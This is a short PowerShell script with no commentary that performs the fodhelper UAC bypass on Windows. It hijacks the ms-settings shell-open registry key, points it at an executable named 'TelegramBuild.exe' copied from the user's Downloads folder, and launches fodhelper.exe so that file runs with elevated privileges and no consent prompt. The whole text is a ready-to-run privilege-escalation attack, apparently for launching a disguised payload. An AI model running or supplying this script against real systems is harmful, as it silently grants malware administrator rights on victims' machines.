New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\$env:USERNAME\not-existent-yet"
 
Copy-Item "C:\Users\$env:USERNAME\Downloads\TelegramBuild.exe" "C:\Users\$env:USERNAME\not-existent-yet"
 
fodhelper.exe
